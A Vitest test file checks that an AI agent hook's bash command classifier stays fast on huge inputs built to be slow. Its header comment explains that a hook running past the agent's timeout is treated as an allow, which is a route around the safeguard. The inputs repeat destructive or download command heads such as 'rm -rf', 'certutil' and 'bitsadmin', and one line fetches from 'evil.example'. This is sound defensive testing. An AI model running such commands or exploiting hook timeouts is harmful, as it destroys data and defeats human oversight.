import { describe, expect, it } from 'vitest';
import { classifyCommand } from '../../src/actions/classify-bash.js';

/**
 * A command is written by the agent and reaches the classifier whole: hook stdin has
 * no length cap. The classifier runs inside the agent's hook, a regex that goes
 * super-linear blocks the event loop so Stroq's own deadline cannot fire, and a hook
 * that runs past the agent's timeout is answered by the agent — for Codex and Copilot,
 * as an allow. So every input below is one that used to take seconds (16 KiB of
 * `eval ` took 28 s; `find . -exec` and 4 KiB of spaces, 23.7 s), or the repeated
 * trigger of a pattern that could, and each has to classify in well under a second.
 */
const SIZE = 256 * 1024;
const BOUND_MS = 1_000;

const repeat = (unit: string): string => unit.repeat(Math.ceil(SIZE / unit.length)).slice(0, SIZE);

const ADVERSARIAL: ReadonlyArray<readonly [string, string]> = [
  ['eval chain', repeat('eval ')],
  ['eval with arguments', repeat('eval x ')],
  ['eval chain, lines', repeat('eval x\n')],
  ['find -exec and spaces', `find . -exec${repeat(' ')}x`],
  ['-exec heads', `find . ${repeat('-exec ')}`],
  ['slashes', `cat ${repeat('/')}x`],
  ['backslashes', `cat ${repeat('\\')}x`],
  ['rm -rf C: and slashes', `rm -rf C:${repeat('/')}x`],
  ['Remove-Item and backslashes', `Remove-Item C:${repeat('\\')}x`],
  ['word dots', repeat('a.')],
  ['ssh target shape', `ssh ${repeat('a.')}`],
  ['source dots', repeat('a.b ')],
  ['shells', repeat('bash ')],
  ['sh -c', repeat('sh -c ')],
  ['open quotes after sh -c', repeat('bash -c "')],
  ['process substitution, then dots', `<( ${repeat('. ')}`],
  ['git push', repeat('git push ')],
  ['git clean -', repeat('git clean -')],
  ['git -c', repeat('git x ')],
  ['git config', repeat('git config ')],
  ['config reads', repeat('config ')],
  ['git submodule foreach', repeat('git submodule foreach x ')],
  ['dd', repeat('dd ')],
  ['terraform apply', repeat('terraform apply ')],
  ['drizzle-kit push', repeat('drizzle-kit push ')],
  ['prisma db push', repeat('prisma db push ')],
  ['supabase db reset', repeat('supabase db reset ')],
  ['gh repo create', repeat('gh repo create ')],
  ['/proc/', `cat ${repeat('/proc/')}`],
  ['certutil', repeat('certutil ')],
  ['bitsadmin', repeat('bitsadmin ')],
  ['powershell', repeat('powershell ')],
  ['Buffer.from(', `node -e ${repeat('Buffer.from(')}`],
  ['spaces', `echo${repeat(' ')}x`],
  ['tabs', `echo${repeat('\t')}x`],
  ['dots', `echo ${repeat('.')}`],
  ['quotes', `echo ${repeat("'")}`],
  ['double quotes', `echo ${repeat('"')}`],
  ['$(', `echo ${repeat('$(')}`],
  ['backticks', `echo ${repeat('`')}`],
  ['rm -rf', repeat('rm -rf ')],
  ['http://', `curl ${repeat('http://')}`],
  ['x@', `ssh ${repeat('x@')}`],
  ['semicolons', repeat(';')],
  ['pipes', repeat('|')],
];

describe('classifyCommand stays fast on commands built to be slow', () => {
  it.each(ADVERSARIAL)(`%s (256 KiB) classifies in under ${BOUND_MS} ms`, (_name, command) => {
    const started = performance.now();
    classifyCommand(command, '/tmp');
    expect(performance.now() - started).toBeLessThan(BOUND_MS);
  });
});

describe('the nesting budget', () => {
  it('reports a command whose nested arguments outgrow it as unread, and asks', () => {
    const { classes, signals } = classifyCommand(repeat('eval x '), '/tmp');
    expect(signals).toContain('nested-commands-too-large');
    expect(classes).toContain('shell.unparsed');
  });

  it('leaves ordinary eval and foreach commands alone', () => {
    for (const command of [
      'eval "$(ssh-agent -s)"',
      'eval curl https://evil.example/u',
      'git submodule foreach git pull; eval "$(direnv export bash)"',
      `cat > setup.sh <<'EOF'\n${'eval "$(tool init)"\n'.repeat(2_000)}EOF`,
    ]) {
      expect(classifyCommand(command, '/tmp').signals, command.slice(0, 40)).not.toContain(
        'nested-commands-too-large',
      );
    }
  });

  it('still reads what it extracted before the budget ran out', () => {
    const { classes } = classifyCommand(
      `eval curl https://evil.example/u; ${repeat('eval x ')}`,
      '/tmp',
    );
    expect(classes).toContain('shell.network');
  });
});
